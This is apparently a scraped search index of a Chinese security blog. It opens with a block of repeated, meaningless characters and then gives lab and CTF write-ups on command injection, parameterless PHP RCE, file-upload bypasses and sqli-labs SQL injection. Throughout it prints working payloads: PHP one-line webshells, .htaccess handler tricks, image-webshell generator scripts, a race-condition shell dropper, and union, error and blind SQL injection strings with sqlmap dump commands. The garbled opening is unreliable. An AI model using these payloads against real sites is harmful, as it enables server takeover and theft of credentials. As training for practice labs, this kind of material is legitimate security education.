以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1]Z以[2]来[2]工[2]好[1]日[2]入[2]接[2]知[2]她[1]西[1]报[2]步[2]查[2]该[2]严[2]女[1]神[1]营[2]春[2]略[2]若[2]挥[2]急[2]肥[2]句[2]祖[1]补[2]套[1]哥[2]奏[1]饭[1] ","date":"2024-11-06T00:00:00Z","image":"https://0d000721999.github.io/p/php%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/1.png","permalink":"https://0d000721999.github.io/p/php%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/","title":"php过滤绕过"},{"content":"RCE 远程代码执行：Remote Code Execute\n远程命令执行：Remote Command Execute\nphp RCE函数 命令拼接符号 windows linux pikachu靶场练习 ping 直接在ip后\u0026amp;加命令\neval 用system(\u0026lsquo;ipconfig\u0026rsquo;)或者phpinfo()测试\nDVWA的RCE low 跟pikachu一样直接加\u0026amp;\nmedium 因为平台是Windows，而靶场过滤的是Linux连接符，所以跟上面一样\nhigh 查看源码管道符|后有空格\n我们不加空格直接拼接\nctfhub练习 eval执行 蚁剑连接，右键打开终端\n然后ls /根目录下就有flag\n命令注入-无过滤 要求输入ip,没有过滤\n直接输入127.0.0.1;ls查看目录下文件\n有一个php文件，cat查看没东西\n直接转base64编码\n1 127.0.0.1;cat xxx.php|base64 然后解码得到flag\n命令注入-过滤cat 改为less就行了\n其他命令\n1 2 3 4 5 6 7 8 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的现实文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号 tailf 类似于tail -f 命令注入-过滤空格 1 使用$IFS$9、%09、\u0026lt;、\u0026gt;、\u0026lt;\u0026gt;、{,}、%20、${IFS}、${IFS}来代替空格 命令注入-过滤命令分隔符 cd跳目录再cat，或者%0a代替目录分隔符/(在url里面输入)\n过滤运算符 其实前面要base64是因为源码被注释了\n所以我们正常cat flag然后查看源码\n综合过滤 flag过滤用f***绕过\ncat改为more\n;用%0a\n然后跟上面一样构造payload到url里面\n1 127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_61177426640.php 防御 1、尽量不要使用命令执行的函数\n2、如果必须使用，需要做白名单处理\n3、用正则表达式对用户输入的内容进行处理\n4、使用WAF\n","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/rce/1.jpg","permalink":"https://0d000721999.github.io/p/rce/","title":"RCE"},{"content":"无参rce 1、getallheaders() getallheaders()返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。\nimplode()能够直接将getallheaders()返回的数组转化为字符串。\n可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。\n1 ?exp=eval(implode(getallheaders())); 2、get_defined_vars() 该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与implode结合起来用。要用var_dump()输出\n用GET传入的参数会被显示在数组中的第一位\n要返回数组的第一个值要用current()函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通过这个函数将其取出来\n1 var_dump(current(get_defined_vars())); 如果我们传值是这样：\n1 ?get=a\u0026amp;shell=phpinfo(); 后面传入的shell=phpinfo();出现在了第一个数组的最后。\nend()函数可以倒序，也就是说我们可以将命令写到后面的参数再调用函数，执行shell命令\n1 ?exp=eval(end(current(get_defined_vars())));\u0026amp;shell=phpinfo(); 3、session_id() session_id()可以用来获取/设置当前会话 ID。 那么可以用这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的\n文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号)\n解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。\n1 2 ?exp=eval(hex2bin(session_id(session_start()))); 或者?exp=eval(session_start();system(hex2bin(session_id()))); 执行的命令bp写入16进制解析\n1 hex(\u0026#34;phpinfo();\u0026#34;)=706870696e666f28293b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 getchwd() 函数返回当前工作目录。 scandir() 函数返回指定目录中的文件和目录的数组。 dirname() 函数返回路径中的目录部分。 chdir() 函数改变当前的目录。 readfile() 输出一个文件。 current() 返回数组中的当前单元, 默认取第一个值。 pos() current() 的别名。 next() 函数将内部指针指向数组中的下一个元素，并输出。 end() 将内部指针指向数组中的最后一个元素，并输出。 array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 array_slice() 函数在数组中根据条件取出一段值，并返回。 array_reverse() 函数返回翻转顺序的数组。 chr() 函数从指定的 ASCII 值返回字符。 hex2bin() — 转换十六进制字符串为二进制字符串。 getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。 ","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/1.png","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/","title":"无参RCE"},{"content":"文件上传 一句话木马\n1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; webshell https://github.com/tennc/webshell\n网站控制工具 中国菜刀 中国蚁剑 https://github.com/AntSwordProject/antSword\nweevely https://github.com/epinna/weevely3\n哥斯拉godzila https://github.com/BeichenDream/Godzilla\n冰蝎 behinder https://github.com/rebeyond/Behinder\nweevely(kali) 生成木马\n1 weevely generate cmd weevely.php 连接\n1 weevely ip cmd 就可以执行命令了\nupload-labs靶场练习 pass01 提示不让上传php,猜测是前端验证\n禁用js或者\n按下上传要检测，我们直接删掉onsubmit\n上传直接蚁剑连接\npass02 提示对数据包的MIME检查\nMIME Multipurpose Internet Mail Extensions\n多用途互联网邮件扩展类型\n客户端使用：\n1、GET请求不需要这个字段。\n2、POST请求头，放在Content Type字段用来指定上传的文件类型，方便服务器解析。放在Accept，告诉服务端允许接收的响应类型。比如只能接收json或者其他。\n服务端使用：\n放在响应头里面，Content Type告诉客户端响应的数据类型，方便客户端解析。\n官方解释：https://developermozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types\n所以用bp抓包，在我们上传的一句话木马的content-type中修改成image/jpeg，再放行\n蚁剑连接\npass03 黑名单里面有php\n等价拓展名 首先要修改apache的配置\n加上一行将后面这些拓展识别成php,不知道为什么不行\n换一种方式，把后缀名改为.htaccess，也不行\npass04 .htaccess .htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置 。通过 .htaccess 文件，可以实现：网页 301 重定向、自定义404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n先上传图片（shell.php改后缀为jpg)然后上传.htaccess\n1 2 3 \u0026lt;FilesMatch \u0026#34;shell.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 或者\n1 AddType application/x-httpd-php .jpg 1 SetHandler application/x-httpd-php 把图片匹配为php代码\npass05 查看提示存在readme.php\nphp.ini是php的一个全局配置文件，对整个web服务起作用\n而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的php.ini\n1 2 3 4 5 .user.ini 配置项中有两个配置可以起到一些作用 方法一： auto_prepend_file = \u0026lt;filename\u0026gt; //包含在文件头 方法二： auto_append_file = \u0026lt;filename\u0026gt; //包含在文件尾 上传要改php.ini\n下面那个原来是300秒我们改为10秒\n重启服务后\n上传两个文件\n蚁剑连接的文件要改为readme.php\n也可以用 php. . 点空格点 绕过上传\npass06 大小写过滤不全，用PHP就能上传\npass07 没有过滤空格，抓包后在bp里面把文件后缀加空格放行\n然后就连接上了\npass08 抓包改为.php.\npass09 后缀名未做去::$DATA处理\n1 Windows系统下，如果上传的文件名为`9.php::$DATA`会在服务器上生成一个9.php的文件，其内容和所上传文件内容相同并被解析。 连接时要把::$DATA去掉\npass10 因为会去掉末尾的点和头尾空格\n.php. .（点空格点）\npass11 后缀重写绕过\n.pphphp\npass12 需要php的版本号低于5.3.29，且magic_quotes_gpc为关闭状态（需要自己关闭）\nContent-Disposition 作为对下载文件的一个标识字段\n官方解释：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition\n文件名截断 截断字符：chr(0) ，类似于C++的\u0026quot;\\0\u0026quot;\n在url编码里面所以要输入%00\n下面那里改成符合条件的后缀名，上面上传路径填写我们的木马然后用%00截断\npass13 现在路径不是url编码，要用16进制，先写个+占位，+的16进制是2b\nhex改为00\npass14 要上传图片马，并且利用文件包含漏洞来实现运行图片中的木马\n1 2 3 4 5 6 7 8 9 10 补充： Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG Jpg图片文件包括2字节：FF D8。 Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。 Bmp图片文件包括2字节：42 4D。即为 BM 图片马制作： 在cmd里执行 copy logo.jpg/b+test.php/a test.jpg logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马 linux里面用 cat logo.jpg shell.php\u0026gt;shell.jpg 上传完成后,在include.php后加上传的文件路径\n1 http://upload-labs/include.php?file=upload/xxx.jpg pass15 这里getimagesize()检查是否为图片文件\n1 2 getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。 pass16 1 2 exif_imagetype()读取一个图像的第一个字节并检查其后缀名。 返回值与getimage()函数返回的索引2相同，但是速度比getimage快 跟14一样\npass17 题目用二次渲染把我们图片马里面的马给清除了\ngif的解决办法\n上传图片然后下载回显图片\n用010editor对比，找到相同的地方（上传前和上传后，两张图片Hex仍然保持不变的位置）并插入木马\n我们直接用现成的图片马，利用文件包含，连接成功\n其他图片格式的办法参考upload-labs之pass 16详细分析 - 先知社区\npng脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;./1.png\u0026#39;); ?\u0026gt; 生成的木马是\n1 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; jpg脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 \u0026lt;?php $miniPayload = \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34;; if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { die(\u0026#39;php-gd is not installed\u0026#39;); } if(!isset($argv[1])) { die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); } set_error_handler(\u0026#34;custom_error_handler\u0026#34;); for($pad = 0; $pad \u0026lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u0026gt;readShort() != 0xFFD8) { die(\u0026#39;Incorrect SOI marker\u0026#39;); } while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { $marker = $dis-\u0026gt;readByte(); $size = $dis-\u0026gt;readShort() - 2; $dis-\u0026gt;skip($size); if($marker === 0xDA) { $startPos = $dis-\u0026gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u0026gt;eof())) { if($dis-\u0026gt;readByte() === 0xFF) { if($dis-\u0026gt;readByte !== 0x00) { break; } } } $stopPos = $dis-\u0026gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { die(\u0026#39;Success!\u0026#39;); } else { break; } } } } unlink(\u0026#39;payload_\u0026#39;.$argv[1]); die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u0026gt;binData = \u0026#39;\u0026#39;; $this-\u0026gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); $this-\u0026gt;binData = file_get_contents($filename); } else { $this-\u0026gt;binData = $filename; } $this-\u0026gt;size = strlen($this-\u0026gt;binData); } public function seek() { return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); } public function skip($skip) { $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); } public function readByte() { if($this-\u0026gt;eof()) { die(\u0026#39;End Of File\u0026#39;); } $byte = substr($this-\u0026gt;binData, 0, 1); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u0026gt;binData) \u0026lt; 2) { die(\u0026#39;End Of File\u0026#39;); } $short = substr($this-\u0026gt;binData, 0, 2); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); if($this-\u0026gt;order) { $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); } } ?\u0026gt; 运行脚本命令\n1 jpg_payload.php 1.jpg pass18 代码审计，传入文件与删除有时间差\n思路：\n条件竞争代码\n1 2 3 4 5 6 //18.php \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;); ?\u0026gt; #访问18.php，会在目录下生成一个shell.php 用bp来重复上传\n发到intruder模块，payload设置为空，用于无限访问\n线程设置大点\n开始爆破，同时要手动访问文件\npython访问\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xxx/upload-labs/upload/18.php\u0026#34; while True: html = requests.get(url) if html.status_code == 200: print(\u0026#34;OK\u0026#34;) break pass19 原题有点问题\n改myupload的源码\n拼接/\n利用apach解析漏洞\n1 xxx.php.* -\u0026gt;xxx.php 然后我们bp不断上传白名单内的后缀\n例如shell.php.7z\n另一种思路，将上一关重复生成代码的木马做成图片马\n反复上传图片马\n这里访问的python脚本为：\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png\u0026#34; while True: html = requests.get(url) if ( \u0026#39;Warning\u0026#39; not in str(html.text)): print(\u0026#39;ok\u0026#39;) break 直到生成shell.php为止\npass20 利用函数漏洞\n1 move_uploaded_file()会忽略掉文件末尾的 /.，主要作用是将临时文件移到指定的目标路径，并确保文件在移动中不会被删除或覆盖。 所以我们上传shell.php/.上传后会变成shell.php\npass21 修改content-type 修改POST参数为数组类型，就是save_name[]; 索引[0]为shell.php， 索引[2]为jpg|png|gif。 只要第二个索引不为1，就是不能为save_name[1]; $file[count($file) - 1]就等价于$file[2-1]，值为空绕过\n漏扫工具 https://github.com/almandin/fuxploider\n防御 linux文件权限 ","date":"2024-10-09T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"文件上传漏洞"},{"content":"sqli-labs靶场练习 less1 尝试单引号闭合，是字符型注入。\n判断字段数 找回显点\n收集信息\n爆破数据库 1 2 3 4 5 6 7 爆破数据库 ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ group_concat()函数可以让多个数据在一行显示，但是只能显示64位，可以选择截取或者用limit的方式 显示全部数据 ?id=-1\u0026#39; union select 1,2,(schema_name) from information_schma.schemata limit 0,1--+ 爆破表名 1 2 3 爆破表名 ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段名 1 2 3 爆破字段名 ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破字段 1 2 3 爆破字段 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from users)--+ less1 sqlmap的运用 1 python sqlmap.py -u ip --batch//跳过询问 python环境打开\n1 2 猜解当前数据库名称 sqlmap.py -u ip --batch --current-db 1 2 猜解表名 sqlmap.py -u ip --batch -D \u0026#34;security\u0026#34; --tables 1 2 猜解字段 sqlmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --columns 1 2 脱库 sqmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --dump less2 数字型注入\n判断字段数\n1 ?id=1 or 1=2 order by 4--+ 找到回显点，信息收集\n1 ?id=-1 union select 1,2,3--+ 开始注入\n1 2 3 4 5 6 7 8 9 10 11 12 爆破数据库 ?id=-1 union select 1,2,group_concat(schema_name)from information_schema.schemata--+ 爆破表单名 ?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破字段内容 ?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)- -+ less3 闭合方式是')\n判断字段数\n1 ?id=1\u0026#39;) and 1=1\torder by 4--+ 找回显点，信息收集，然后注入\n1 2 3 4 5 6 7 8 9 10 11 12 爆破数据库 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(schema_name)from information_schema.schemata--+ 爆破表单 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(colum_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破数据 ?id=1\u0026#39;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less4 闭合方式是\u0026quot;)\n1 2 3 4 5 6 7 8 9 信息收集，字段判断，爆破数据库表 ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(column_name)from information_schema.columns where table_name=\u0026#34;users\u0026#34;--+ 最后爆破出所有数据 ?id=1\u0026#34;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less5 没有用户和id的回显，查看有无报错回显，找到闭合方式\n闭合为单引号闭合，查字段数\n这边输入为假的条件看看\n查看源码，可以使用报错注入\n报错注入 报错常用的三个函数，extractvalue(),updatexml(),floor(),还有exp(),\n1. 用extractvalue函数进行报错注入。 1 2 3 爆破数据库 ?id=1\u0026#39; or/and extractvalue(1,concat(0x7e,database()/(select database()),0x7e))--+ 1 2 3 爆破数据库表 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e))--+ 1 2 3 爆破字段 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e))--+ group-concat()函数可能放不下所有内容，可以采用截取或者limit函数读取\n1 2 3 爆破数据内容 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))--+ 2. 用updatexml()函数进行报错注入 1 2 3 4 5 6 7 8 9 10 11 爆破数据库 ?id=1\u0026#39; or/and updatexml(1,concat(0x7e,database()/(select database()),0x7e),1)--+ 爆破数据库表 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ 爆破字段 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e),1)--+ 爆破数据内容 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+ 3.通过floor()函数进行报错注入，前提需要知道有多少字段数 1 2 3 爆破数据库 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 爆破数据库表 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 爆破字段 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 爆破数据库内容 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (username)from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ sqlmap梭less5 -dbs枚举数据库 使用-o参数优化,\u0026ndash;batch参数进行跳过，\u0026ndash;threads参数开启更多线程\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 -o --threads=10 -dbs --batch 注意，耗时过久，主要是联合查询耗时，从结果看并没有联合查询注入。\n\u0026ndash;tables枚举数据库表 添加\u0026ndash;technique参数加速，\u0026ndash;dbms指定\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o --threads=10 -D security --tables --batch \u0026ndash;columns枚举列 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users --columns --batch \u0026ndash;dump枚举数据 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users -C username,password --dump --batch less6 把less5的单引号闭合改为双引号\nless7 看回显\nSQl注入的写入与读取\n读取文件 load_file(文件的路径)\n写入文件into outfile(),into_dumpfile()\n猜闭合方式是\u0026rsquo;))\n猜字段数\n通过页面回显布尔方式猜解到字段数为3，能够读写需要的几个条件\n需要高权限(root权限)\n需要有问价写入权限secure_file_priv不是NULL\n需要知道绝对路径\n魔术引号gbc时关闭的 magic_quotes_gpc = Off\n关键步骤：写入木马 1 2 ?id=1\u0026#39;)) and 1=2 union select 1,2,\u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]) ?\u0026gt;\u0026#34;%20 into outfile \u0026#34;X:\\\\xx\\\\xx\\\\xx\\\\xx\\\\shell.php\u0026#34;--+ 小问题：文件无法写入 原因是MySQL数据库里\nsecure_file_priv 这个参数设置为了null或者没有设这个参数。\n写入后蚁剑提权。\n要将url后加shell.php才能连上\nless8 找到闭合方式为单引号，但是没有回显，因此报错注入的方法已经不能够实现注入\n对和错返回不同的页面回显，可以采用布尔盲注的方式\n布尔盲注 判断字段数\n字段数为3\n1 2 3 猜解数据库名字的长度 ?id=-1\u0026#39; or length(database())=8--+ 小tips：一那么采用逻辑或，因为无法确保前面的条件一定为真 1 2 3 4 5 6 逐一猜解数据库 ?id=-1\u0026#39; or ascii(substr(database(),1,1))=115--+ 或者 ?id=-1\u0026#39; or ascii(mid(database(),1,1))=115--+ 或者 ?id=-1\u0026#39; or mid(database(),1,1)=\u0026#39;s\u0026#39;--+ 按照相同的方法猜解数据表的名字和字段内容\n1 2 ?id=-1\u0026#39; or ascii(mid(select (table_name) from information_schema.tables where table_schema=database() limit 1,1))=?--+ 对于布尔盲注的问题，一般采用脚本进行猜解或者使用sqlmap\nsqlmap梭less8 -dbs枚举数据库 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 -o -dbs --batch \u0026ndash;tables枚举数据库表 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security --tables --batch \u0026ndash;columns枚举列 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users --columns --batch \u0026ndash;dump枚举数据 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users -C username,password --dump --batch 关于sqlmap \u0026ndash;technique 参数 1 2 3 4 5 6 7 8 9 10 11 B：Boolean-based blind（布尔型注入） E：Error-based（报错型注入） U：Union query-based（可联合查询注入） S：Stacked queries（可多语句查询注入） T：Time-based blind（基于时间延迟注入） Q：Inline queries（嵌套查询注入） less9 怎么闭合都不对\n试试时间盲注\n1 2 例如 ?id=-1\u0026#39; or if(length(database())=8,sleep(5),0)--+ 发现界面有延迟\n1 2 3 猜解数据库名称 ?id=-1\u0026#39; or if(ascii(mid(database(),1,1))\u0026lt;=135,sleep(5),0)--+ 相同的方式猜解数据表数据字段 sqlmap梭less9 把参数改为T\nless10 与Less9的区别在于闭合方式为 双引号，同样是时间盲注\nless11 